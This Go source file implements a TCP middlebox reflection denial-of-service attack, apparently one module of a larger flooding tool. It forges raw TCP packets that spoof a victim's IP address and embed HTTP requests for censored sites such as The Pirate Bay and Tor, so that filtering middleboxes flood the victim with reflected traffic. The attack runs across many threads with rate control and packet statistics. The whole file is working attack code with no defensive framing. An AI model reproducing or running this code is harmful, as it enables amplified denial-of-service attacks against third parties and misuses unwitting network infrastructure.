package main

import (
	"context"
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"runtime"
	"sync"
	"time"
)

// Internal variables to allow mocking in tests
var (
	openRawSocketInternal = openRawSocket
	sendtoRawInternal     = sendtoRaw
	closeSocketInternal   = closeSocket
)

func buildMiddleboxPacketOptimized(victimIP, reflIP net.IP, reflPort uint16, localRand *rand.Rand, buf []byte) []byte {
	srcPort := uint16(localRand.Intn(60000) + 1024)

	options := []byte{
		0x02, 0x04, 0x05, 0xb4, // MSS: 1460
		0x03, 0x03, 0x07, // Window Scale: 7
		0x04, 0x02, // SACK Permitted
		0x01, 0x01, 0x01, // 3x NOP for padding
		0x00, // End of options
	} // Total: 12 bytes (aligned)

	tcpHeaderLen := 20 + len(options)
	tcp := buf[20 : 20+tcpHeaderLen]
	for i := range tcp { tcp[i] = 0 }

	binary.BigEndian.PutUint16(tcp[0:], srcPort)
	binary.BigEndian.PutUint16(tcp[2:], reflPort)
	binary.BigEndian.PutUint32(tcp[8:], localRand.Uint32()) // Realistic Ack number
	tcp[12] = uint8(tcpHeaderLen/4) << 4
	tcp[13] = 0x18                              // PSH + ACK flags (DPI bypass in 2026)
	binary.BigEndian.PutUint16(tcp[14:], 65535) 

	copy(tcp[20:], options)

	triggers := []string{
		"www.thepiratebay.org",
		"www.pornhub.com",
		"www.bet365.com",
		"www.torproject.org",
		"www.wikileaks.org",
		"www.scihub.org",
		"www.pokerstars.com",
		"www.mega.nz",
		"www.rt.com",
	}
	targetHost := triggers[localRand.Intn(len(triggers))]

	payloadStr := fmt.Sprintf("GET / HTTP/1.1\r\n"+
		"Host: %s\r\n"+
		"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36\r\n"+
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\n"+
		"Accept-Language: en-US,en;q=0.9\r\n"+
		"Referer: https://www.google.com/\r\n"+
		"Connection: close\r\n\r\n", targetHost)

	payload := []byte(payloadStr)
	copy(buf[20+tcpHeaderLen:], payload)
	fullPacket := buf[20 : 20+tcpHeaderLen+len(payload)]

	pseudo := make([]byte, 12+len(fullPacket))
	copy(pseudo[0:4], victimIP.To4())
	copy(pseudo[4:8], reflIP.To4())
	pseudo[9] = IPPROTO_TCP
	binary.BigEndian.PutUint16(pseudo[10:], uint16(len(fullPacket)))
	copy(pseudo[12:], fullPacket)

	// ASSEMBLY ORDER FIX: Write checksum directly into the FINAL buffer
	binary.BigEndian.PutUint16(fullPacket[16:], checksum(pseudo))

	buildIPHeaderLocalOptimized(victimIP, reflIP, IPPROTO_TCP, 20+len(fullPacket), localRand, buf[0:20])
	return buf[:20+len(fullPacket)]
}

func startMiddleboxReflection(ctx context.Context, opts ContextOpts, targetIP string, targetPort int, threads int, duration time.Duration, reflectors []ReflectorData, pps int) {
	if len(reflectors) == 0 {
		LogErr("L4", "No reflectors available for Middlebox reflection")
		return
	}

	LogInfo("L4", "Starting TCP Middlebox Reflection on %s:%d using %d reflectors", targetIP, targetPort, len(reflectors))

	var wg sync.WaitGroup

	type parsedRef struct {
		IP   net.IP
		Port uint16
	}
	var parsedRefs []parsedRef
	for _, r := range reflectors {
		cleanIP := r.Addr
		if h, _, err := net.SplitHostPort(r.Addr); err == nil {
			cleanIP = h
		}
		if ip := net.ParseIP(cleanIP).To4(); ip != nil {
			parsedRefs = append(parsedRefs, parsedRef{IP: ip, Port: uint16(r.Port)})
		}
	}

	if len(parsedRefs) == 0 {
		LogErr("L4", "No valid reflectors found for Middlebox")
		return
	}

	dstIP := net.ParseIP(targetIP).To4()
	if dstIP == nil {
		LogErr("L4", "Invalid target IP: %s", targetIP)
		return
	}

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func(threadID int) {
			defer func() { if r := recover(); r != nil { LogErr("SYS", "Panic in Middlebox: %v", r) } }()
			defer wg.Done()
			runtime.LockOSThread()
			defer runtime.UnlockOSThread()

			src := rand.NewSource(time.Now().UnixNano() + int64(threadID))
			localRand := rand.New(src)

			sockFd, err := openRawSocketInternal(IPPROTO_TCP)
			if err != nil {
				return
			}
			defer closeSocketInternal(sockFd)

			tcpBuf := make([]byte, 1500)

			for {
				// High-performance batching
				batchSize := 32 // TCP is heavier, smaller batch
				if pps > 0 {
					if pps < 500 {
						batchSize = 1
					} else if pps < 5000 {
						batchSize = 4
					}
					sleep := time.Second / time.Duration((pps/threads)/batchSize+1)
					time.Sleep(sleep)
				}

				select {
				case <-ctx.Done():
					return
				default:
					for b := 0; b < batchSize; b++ {
						ref := parsedRefs[localRand.Intn(len(parsedRefs))]
						reflIP := ref.IP
						reflPort := ref.Port

						packet := buildMiddleboxPacketOptimized(dstIP, reflIP, uint16(reflPort), localRand, tcpBuf)

						if sockFd != InvalidSocket {
							sendtoRawInternal(sockFd, packet, reflIP, int(reflPort))
							AddStats(1, int64(len(packet)))
						}
					}
				}
			}
		}(i)
	}

	<-ctx.Done()
	wg.Wait()
	LogInfo("L4", "TCP Middlebox Reflection finished")
}
